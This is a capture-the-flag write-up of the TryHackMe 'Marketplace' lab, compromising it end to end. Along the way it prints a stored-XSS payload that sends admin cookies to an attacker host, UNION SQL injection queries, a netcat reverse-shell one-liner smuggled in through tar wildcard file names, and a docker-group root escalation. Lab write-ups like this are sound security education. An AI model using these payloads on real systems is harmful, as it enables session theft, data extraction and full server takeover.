---
title: Marketplace tryhackme writeup
published: true
---

Today I bring you the writeup of [marketplace](https://tryhackme.com/room/marketplace), a tryhackme machine focused on web exploitation, here we go!

First we start with a port scan to see which ports are open.

```shell
nmap -p- --min-rate 5000 IP
```

With -p- we indicate that we want it to look at all ports and the --min-rate 5000 to do it very fast.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escaneo_1.png)

Now that we know the ports, let's scan them deeply to see versions and so on.

```shell
nmap -sC -sV -p22,80,32768 --min-rate 5000 IP
```

With -sC we indicate that we want to run the default nmap scripts and -sV to get the service versions.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escaneo_2.png)

We see that we get the robots.txt with /adminm then we will enter

We investigate ports 80 and 32768 and go to exactly the same web, so we will skip port 32768.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/web_home.png)

If we go to /admin it tells us this

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/admin.png)

We are going to register a new account to be able to see the product options and so on.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/registrar.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/logeo.png)

Let's enter a product and click on the two options below, the one to report the product and the one to write to the product creator.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/producto.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/mensage_creador.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/mensaje_mandado.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/reportar_producto.png)

When reporting we get a message that the admin has checked the product; we have an option to create a product, we go there.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/mensaje_despues_de_reportar_en_messages.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/new_listing.png)

Let's check if the creation of a product has xss and we could try to steal cookies from the admin when checking a report

```shell
<script>alert(1)</script>
<script>alert(2)</script>
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/nuevo_producto_con_xss_prueba.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/xss_1_ok.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/xss_2_ok.png)

We see that it is vulnerable, we are going to create another product to steal the cookies, but first we are going to open a python server to get them.

```shell
python3 -m http.server
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/python_server_para_xss_cookies_al_reportar.png)

Now to make the product for the cookies.

```shell
<img src=x onerror=this.src="http://IP:Port/?c="+document.cookie>
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/Producto_roba_cookies.png)

When we enter the product and hit report we will get the admin cookies, now let's change ours for those and go to /admin.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/cookie_admin.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/panel_admin_con_cookies.png)

We are going to enter in some user that we get.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/admin_user_1.png)

If we see the url we can try a sqli.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/prueba_sqli.png)

It seems vulnerable, let's try to exploit it, with sqlmap I couldn't because the admin cookie changes every x time so you will have to get it again.

Let's see how many fields you have to write to do our tests.

```shell
user=1 order by 4-- -
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/numero de columnas.png)

Now let's try to get the databases.

```shell
user=0 union select 1,group_concat(0x7c,schema_name,0x7c),3,4 from information_schema.schemata-- -
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/databases.png)

We are interested in the database marketplace, now let's take out the tables it has.

```shell
user=0 union select 1,group_concat(0x7c,table_name,0x7c),3,4 from information_schema.tables where table_schema='marketplace'-- -
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/tablas.png)

We see a messages table that seems quite interesting since the others are in the admin panel itself, at least, apparently.

```shell
user=0 union select 1,group_concat(0x7c,column_name,0x7c),3,4 from information_schema.columns where table_name='messages'-- -
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/nombre de columnas de tabla mensajes.png)

Let's take a look at the message_content to see if it has anything interesting.

```shell
user=0 union select 1,group_concat(0x7c,message_content,0x7c),3,4 from marketplace.messages-- -
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/contenido de los mensajes, donde hay ssh password.png)

We see a password, and we have several usernames of accounts created before ours which are:
system
michael
jake

Let's try to connect via ssh to those accounts.

```shell
ssh jake@IP
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/shell con jake.png)

Let's look at the sudo permissions you have.

```shell
sudo -l
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/sudo -l jake.png)

We see that you have permissions with the user michael in a script, if we read that script we see that it makes a backup of everything in the /opt/backups folder.

To escalate privileges to michael we can use the [wildcards](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks#tar) of tar so that we get a reverse when we make the backup.

```shell
nc -lvp PORT
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/abrimos puerto.png)

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
chmod 777 shell.sh
chmod 777 backup.tar
sudo -u michael /opt/backups/backup.sh
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/comandos_movimiento_lateral.png)

We get the reverse and we are already michael.

```shell
id
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/grupo docker para escalar.png)

We see that it is inside the [docker](https://gtfobins.github.io/gtfobins/docker/#shell) group, let's use that to escalate privileges.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escalada a root.png)

And that's all! thanks for reading.
